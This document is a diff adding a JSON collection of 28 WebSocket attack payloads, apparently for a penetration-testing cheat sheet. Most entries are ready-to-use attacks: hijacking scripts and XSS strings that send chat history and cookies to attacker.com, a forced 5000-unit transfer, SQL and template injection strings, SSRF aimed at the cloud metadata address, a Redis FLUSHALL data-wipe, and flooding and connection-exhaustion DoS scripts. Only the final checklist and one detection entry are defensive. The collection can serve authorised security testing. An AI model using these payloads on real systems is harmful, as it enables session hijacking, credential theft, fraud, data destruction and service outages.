@@ -1,0 +1,236 @@
+{
+  "meta": {
+    "name": "WebSocket Attacks",
+    "icon": "🔌",
+    "description": "WebSocket attack payloads covering CSWSH, injection, XSS via WS, SSRF, origin bypass, and message manipulation.",
+    "version": "1.0",
+    "updated": "2025-01-01",
+    "total": 28
+  },
+  "payloads": [
+    {
+      "id": "ws001",
+      "code": "<script>\n  var ws = new WebSocket('wss://target.com/chat');\n  ws.onopen = () => ws.send('{\"action\":\"getHistory\"}');\n  ws.onmessage = e => fetch('https://attacker.com/?d='+btoa(e.data));\n</script>",
+      "description": "Cross-Site WebSocket Hijacking (CSWSH): steal chat history from victim's authenticated WS session",
+      "category": "hijacking",
+      "platform": ["browser", "html"],
+      "tags": ["cswsh", "csrf", "hijacking", "history", "exfil"]
+    },
+    {
+      "id": "ws002",
+      "code": "<script>\n  fetch('https://target.com/api/csrf-token', {credentials:'include'})\n    .then(r=>r.json()).then(d=>{\n      var ws = new WebSocket('wss://target.com/ws?token='+d.token);\n      ws.onopen = () => ws.send('{\"type\":\"transfer\",\"to\":\"attacker\",\"amount\":5000}');\n    });\n</script>",
+      "description": "CSWSH with CSRF token: fetch token first, then hijack WebSocket to trigger privileged action",
+      "category": "hijacking",
+      "platform": ["browser", "html"],
+      "tags": ["cswsh", "csrf-token", "transfer", "privileged"]
+    },
+    {
+      "id": "ws003",
+      "code": "# Test for CSWSH: WebSocket lacks CSRF protection if:\n# 1. Server accepts connections from any origin\n# 2. Auth is via cookies (sent automatically by browser)\n# 3. No Origin header validation on upgrade\n# Check: compare Origin: https://evil.com vs Origin: https://target.com response",
+      "description": "CSWSH detection: verify Origin header validation on WebSocket upgrade request",
+      "category": "hijacking",
+      "platform": ["methodology"],
+      "tags": ["cswsh", "detection", "origin", "upgrade"]
+    },
+    {
+      "id": "ws004",
+      "code": "{\"username\": \"admin'--\", \"message\": \"hello\"}",
+      "description": "SQL injection via WebSocket message: inject SQL in username or message field",
+      "category": "injection",
+      "platform": ["websocket", "api"],
+      "tags": ["sqli", "injection", "username", "message"]
+    },
+    {
+      "id": "ws005",
+      "code": "{\"search\": \"' OR '1'='1\", \"room\": \"general\"}",
+      "description": "SQLi via WS search parameter: boolean-based blind injection in WebSocket search",
+      "category": "injection",
+      "platform": ["websocket", "api"],
+      "tags": ["sqli", "blind", "boolean", "search"]
+    },
+    {
+      "id": "ws006",
+      "code": "{\"template\": \"{{7*7}}\", \"context\": \"user\"}",
+      "description": "SSTI via WebSocket: send template expression in message body field",
+      "category": "injection",
+      "platform": ["websocket", "api"],
+      "tags": ["ssti", "template", "injection", "jinja2"]
+    },
+    {
+      "id": "ws007",
+      "code": "{\"cmd\": \"ping 127.0.0.1\", \"type\": \"diagnostic\"}",
+      "description": "Command injection via WebSocket: inject OS command in diagnostic/admin message type",
+      "category": "injection",
+      "platform": ["websocket", "api"],
+      "tags": ["cmdi", "command", "diagnostic", "admin"]
+    },
+    {
+      "id": "ws008",
+      "code": "{\"message\": \"<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>\"}",
+      "description": "Stored XSS via WebSocket: inject XSS payload in broadcast message, executes on all connected clients",
+      "category": "xss",
+      "platform": ["websocket", "browser"],
+      "tags": ["xss", "stored", "broadcast", "cookie-theft"]
+    },
+    {
+      "id": "ws009",
+      "code": "{\"message\": \"<script>var i=new Image;i.src='https://attacker.com/?x='+document.cookie</script>\"}",
+      "description": "XSS via WS with script tag: broadcast to all clients in chatroom",
+      "category": "xss",
+      "platform": ["websocket", "browser"],
+      "tags": ["xss", "script-tag", "broadcast", "chatroom"]
+    },
+    {
+      "id": "ws010",
+      "code": "{\"username\": \"<svg onload=alert(1)>\", \"room\": \"lobby\"}",
+      "description": "SVG XSS via WebSocket username: SVG executed when username rendered in chat UI",
+      "category": "xss",
+      "platform": ["websocket", "browser"],
+      "tags": ["xss", "svg", "username", "dom"]
+    },
+    {
+      "id": "ws011",
+      "code": "GET /chat HTTP/1.1\nHost: target.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nSec-WebSocket-Version: 13\nOrigin: http://localhost",
+      "description": "Origin bypass attempt: use localhost/internal origin to bypass origin whitelist",
+      "category": "origin-bypass",
+      "platform": ["http", "websocket"],
+      "tags": ["origin", "bypass", "localhost", "whitelist"]
+    },
+    {
+      "id": "ws012",
+      "code": "GET /chat HTTP/1.1\nHost: target.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nSec-WebSocket-Version: 13\nOrigin: null",
+      "description": "Null origin bypass: send Origin: null (triggered by sandboxed iframes, data URIs)",
+      "category": "origin-bypass",
+      "platform": ["http", "websocket"],
+      "tags": ["origin", "null", "bypass", "iframe", "sandbox"]
+    },
+    {
+      "id": "ws013",
+      "code": "GET /chat HTTP/1.1\nOrigin: https://target.com.evil.com\nUpgrade: websocket\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nSec-WebSocket-Version: 13",
+      "description": "Subdomain origin bypass: use subdomain that starts with target domain to fool prefix matching",
+      "category": "origin-bypass",
+      "platform": ["http", "websocket"],
+      "tags": ["origin", "subdomain", "prefix-match", "bypass"]
+    },
+    {
+      "id": "ws014",
+      "code": "GET /internal/admin HTTP/1.1\nHost: 169.254.169.254\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nSec-WebSocket-Version: 13",
+      "description": "SSRF via WebSocket: upgrade request targeting AWS metadata service or internal hosts",
+      "category": "ssrf",
+      "platform": ["http", "websocket", "cloud"],
+      "tags": ["ssrf", "aws", "metadata", "internal"]
+    },
+    {
+      "id": "ws015",
+      "code": "{\"type\": \"connect\", \"url\": \"ws://169.254.169.254/latest/meta-data/\"}",
+      "description": "SSRF via WS message: server-side WS client connects to attacker-controlled URL including cloud metadata",
+      "category": "ssrf",
+      "platform": ["websocket", "cloud"],
+      "tags": ["ssrf", "server-side", "metadata", "url-parameter"]
+    },
+    {
+      "id": "ws016",
+      "code": "{\"proxy\": \"ws://localhost:8080/admin\", \"action\": \"forward\"}",
+      "description": "WebSocket proxy abuse: use server as WS proxy to reach internal services",
+      "category": "ssrf",
+      "platform": ["websocket", "api"],
+      "tags": ["ssrf", "proxy", "internal", "localhost"]
+    },
+    {
+      "id": "ws017",
+      "code": "# WebSocket request smuggling via HTTP upgrade\nGET / HTTP/1.1\nHost: target.com\nUpgrade: websocket\nConnection: keep-alive, Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\n# After 101 Switching Protocols, send raw HTTP request through WS tunnel\nGET /admin HTTP/1.1\nHost: target.com",
+      "description": "WebSocket tunneling for HTTP request smuggling: send HTTP requests through established WS tunnel",
+      "category": "manipulation",
+      "platform": ["http", "websocket"],
+      "tags": ["smuggling", "tunnel", "http-upgrade", "admin"]
+    },
+    {
+      "id": "ws018",
+      "code": "# Message replay attack\n# 1. Intercept valid WS message: {\"action\":\"transfer\",\"amount\":10,\"to\":\"bob\",\"nonce\":\"abc123\"}\n# 2. Replay same message — if nonce not validated server-side\nws.send('{\"action\":\"transfer\",\"amount\":10,\"to\":\"bob\",\"nonce\":\"abc123\"}')",
+      "description": "WebSocket message replay: resend intercepted authenticated messages if nonce/sequence not enforced",
+      "category": "manipulation",
+      "platform": ["websocket"],
+      "tags": ["replay", "nonce", "sequence", "message"]
+    },
+    {
+      "id": "ws019",
+      "code": "# Message tampering via Burp Suite WebSocket interceptor\n# 1. Enable Burp proxy WS intercept\n# 2. Intercept: {\"role\":\"user\",\"action\":\"read\"}\n# 3. Modify to: {\"role\":\"admin\",\"action\":\"delete\"}\n# 4. Forward — if server trusts client-supplied role field",
+      "description": "WebSocket message tampering: intercept and modify role/privilege fields in WS messages",
+      "category": "manipulation",
+      "platform": ["burp", "websocket"],
+      "tags": ["tampering", "role", "burp", "privilege", "intercept"]
+    },
+    {
+      "id": "ws020",
+      "code": "# Protocol downgrade: force WS to fall back to HTTP polling\n# Some apps fall back to XHR long-polling if WS unavailable\n# Intercept initial WS handshake and return 400\n# Then watch for HTTP fallback endpoint — may have weaker auth",
+      "description": "Protocol downgrade: block WS upgrade to force weaker HTTP long-poll fallback with looser auth",
+      "category": "manipulation",
+      "platform": ["http", "websocket"],
+      "tags": ["downgrade", "long-poll", "fallback", "auth-bypass"]
+    },
+    {
+      "id": "ws021",
+      "code": "const ws = new WebSocket('wss://target.com/ws');\n// Flood with large messages to exhaust server memory\nws.onopen = () => {\n  const payload = 'A'.repeat(1024 * 1024); // 1MB\n  setInterval(() => ws.send(payload), 10);\n};",
+      "description": "WebSocket DoS via message flooding: send large messages rapidly to exhaust server memory/CPU",
+      "category": "manipulation",
+      "platform": ["javascript", "browser"],
+      "tags": ["dos", "flood", "memory", "exhaust"]
+    },
+    {
+      "id": "ws022",
+      "code": "# WS authentication bypass\n# Some endpoints check auth on HTTP upgrade but not per-message\n# After auth'ing WS connection with low-priv token:\nws.send('{\"action\":\"admin_panel\",\"target\":\"users\"}')\n# Server may not re-verify privilege per message",
+      "description": "Per-message auth bypass: authenticate WS connection, then send privileged messages without re-auth",
+      "category": "hijacking",
+      "platform": ["websocket"],
+      "tags": ["auth-bypass", "privilege", "per-message", "admin"]
+    },
+    {
+      "id": "ws023",
+      "code": "# Insecure WS: ws:// instead of wss://\n# Intercept plaintext WS traffic on same network (coffee shop, etc.)\n# Using mitmproxy:\nmitmproxy --mode transparent --ssl-insecure\n# Then capture and modify WS frames in transit",
+      "description": "Plaintext WS interception: MitM attack on unencrypted ws:// connections on shared networks",
+      "category": "hijacking",
+      "platform": ["network", "mitm"],
+      "tags": ["mitm", "plaintext", "ws", "intercept", "mitmproxy"]
+    },
+    {
+      "id": "ws024",
+      "code": "# Subprotocol abuse\nGET /ws HTTP/1.1\nSec-WebSocket-Protocol: admin, graphql, v2\n# Server may grant admin subprotocol if any listed are accepted\n# Check response: Sec-WebSocket-Protocol: admin",
+      "description": "Subprotocol escalation: request privileged subprotocol (admin, graphql) in WS handshake",
+      "category": "manipulation",
+      "platform": ["http", "websocket"],
+      "tags": ["subprotocol", "escalation", "admin", "handshake"]
+    },
+    {
+      "id": "ws025",
+      "code": "python3 -c \"\nimport websocket\nws = websocket.create_connection('wss://target.com/chat')\nws.send('{\\\"type\\\":\\\"ping\\\",\\\"payload\\\":\\\"'+'A'*65536+'\\\"}')\nprint(ws.recv())\nws.close()\n\"",
+      "description": "WebSocket fuzzing: send oversized/malformed payloads to find buffer overflows or crashes",
+      "category": "manipulation",
+      "platform": ["python", "script"],
+      "tags": ["fuzzing", "buffer-overflow", "oversize", "crash"]
+    },
+    {
+      "id": "ws026",
+      "code": "# Mass connection DoS\nfor i in $(seq 1 10000); do\n  (python3 -c \"\nimport websocket, time\nws = websocket.create_connection('wss://target.com/ws')\ntime.sleep(300)\n\" &)\ndone\n# Exhaust WS connection pool — legitimate users can't connect",
+      "description": "WebSocket connection pool exhaustion: open thousands of idle connections to block legitimate users",
+      "category": "manipulation",
+      "platform": ["python", "linux"],
+      "tags": ["dos", "connection", "pool", "exhaustion"]
+    },
+    {
+      "id": "ws027",
+      "code": "# WS cross-protocol attack\n# Some internal services use raw TCP with text protocol (Redis, memcached)\n# WebSocket frame format + CSWSH → send raw bytes to internal Redis:\nvar ws = new WebSocket('ws://internal-redis:6379/');\nws.onopen = () => ws.send('FLUSHALL\\r\\n');",
+      "description": "Cross-protocol WebSocket attack: open WS to internal TCP services, send raw protocol commands",
+      "category": "ssrf",
+      "platform": ["websocket", "internal"],
+      "tags": ["cross-protocol", "redis", "memcached", "internal", "ssrf"]
+    },
+    {
+      "id": "ws028",
+      "code": "# Detection checklist\n# [ ] Is Origin header validated on upgrade? (compare evil.com vs target.com)\n# [ ] Are cookies/tokens validated per-message or only on connect?\n# [ ] Is wss:// enforced? (no fallback to ws://)\n# [ ] Are message sizes limited? (max frame size)\n# [ ] Are connection counts limited per IP?\n# [ ] Are nonces/sequence numbers used to prevent replay?\n# [ ] Does server validate subprotocol header?",
+      "description": "WebSocket security testing checklist: enumerate key security controls to verify",
+      "category": "detection",
+      "platform": ["methodology"],
+      "tags": ["checklist", "detection", "methodology", "origin", "auth"]
+    }
+  ]
+}
